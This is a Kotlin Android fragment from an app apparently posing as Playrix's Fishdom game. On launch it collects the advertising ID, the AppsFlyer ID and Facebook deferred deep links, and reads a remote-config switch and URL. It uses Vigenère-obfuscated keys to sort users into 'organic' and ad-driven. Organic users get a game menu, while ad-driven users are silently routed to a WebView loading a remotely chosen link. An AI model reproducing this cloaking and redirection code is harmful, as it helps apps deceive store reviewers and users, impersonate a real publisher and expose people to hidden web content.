package com.playrix.fishdomdd.gpl.ui

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.appcompat.app.AlertDialog
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.playrix.fishdomdd.gpl.R
import com.playrix.fishdomdd.gpl.databinding.FragmentTreInitBinding
import com.playrix.fishdomdd.gpl.di.module.IODispatcher
import com.playrix.fishdomdd.gpl.utils.treIsInternetAvailable
import com.playrix.fishdomdd.gpl.utils.vigenere
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineDispatcher
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject

@AndroidEntryPoint
class TreInitFragment : Fragment() {
    @Inject
    @IODispatcher
    lateinit var ioDispatcher: CoroutineDispatcher

    @Inject
    lateinit var treAfLiveData: MutableLiveData<MutableMap<String, Any>>

    private var _binding: FragmentTreInitBinding? = null
    private val binding get() = _binding!!

    private val viewModel: TreInitViewModel by viewModels()

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentTreInitBinding.inflate(layoutInflater)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        treInitLoading()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }

    private fun treInitLoading() {
        binding.pBar.visibility = View.VISIBLE
        if (!treIsInternetAvailable(requireContext())) {
            binding.pBar.visibility = View.GONE
            treShowNoInternetDialog()
            return
        }
        viewModel.initLoading { link ->
            if (link.isNotBlank()) treNavigateToWebFragment(link) else treStartFirebase()
        }
    }

    private fun treStartFirebase() {
        val treSettings =
            FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(2500)
                .build()
        FirebaseRemoteConfig.getInstance().apply {
            setConfigSettingsAsync(treSettings)
            fetchAndActivate().addOnCompleteListener {
                val treUrl = getString(resources.getString(R.string.firebase_root_url))
                val treSwitch = getBoolean(resources.getString(R.string.firebase_switch))
                viewModel.setUrlAndOrganic(treUrl, treSwitch) { correctUrl ->
                    if (correctUrl) treBeginWork() else treNavigateToMenuFragment()
                }
            }
        }
    }

    private fun treBeginWork() = lifecycleScope.launch {
        withContext(ioDispatcher) {
            treStartFb()
            treGetGoogleID()
        }
        treGetAppsFlyerParams()
    }

    private fun treStartFb() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(requireContext()) {
            val treUri = it?.targetUri
            viewModel.treSetDeepLink(treUri)
        }
    }

    private fun treGetGoogleID() {
        val treID = AdvertisingIdClient.getAdvertisingIdInfo(requireContext()).id.toString()
        viewModel.treSetGoogleID(treID)
    }

    private fun treGetAppsFlyerParams() {
        val treAfId = AppsFlyerLib.getInstance().getAppsFlyerUID(requireContext()).toString()
        viewModel.treSetAfUserId(treAfId)
        treAfLiveData.observe(viewLifecycleOwner) {
            it.forEach { inform ->
                when (inform.key) {
                    "ct_eiltsj".vigenere() -> viewModel.treSetAfStatus(inform.value.toString())
                    "ospxl_smlzzj".vigenere() -> viewModel.treSetMediaSource(inform.value.toString())
                    "eoyeliee".vigenere() -> viewModel.treSetCampaign(inform.value.toString())
                    "ct_owlnlvt".vigenere() -> viewModel.treSetAfChannel(inform.value.toString())
                }
            }
            treCollectLink()
        }
    }

    private fun treCollectLink() {
        binding.pBar.visibility = View.GONE
        if (viewModel.checkForOrganic()) {
            treNavigateToMenuFragment()
            return
        }

        viewModel.treCollectLink(requireContext()) { link ->
            treNavigateToWebFragment(link)
        }
    }

    private fun treShowNoInternetDialog(): AlertDialog =
        MaterialAlertDialogBuilder(requireContext()).setTitle("No internet connection")
            .setMessage("Check your internet connection and try again later")
            .setCancelable(false)
            .setPositiveButton("Try again") { dialog, _ ->
                treInitLoading()
                dialog.dismiss()
            }
            .show()

    private fun treNavigateToWebFragment(link: String) {
        val action = TreInitFragmentDirections.actionTreInitFragmentToTreWebFragment(link)
        findNavController().navigate(action)
    }

    private fun treNavigateToMenuFragment() {
        val action = TreInitFragmentDirections.actionGlobalMenuFragment()
        findNavController().navigate(action)
    }
}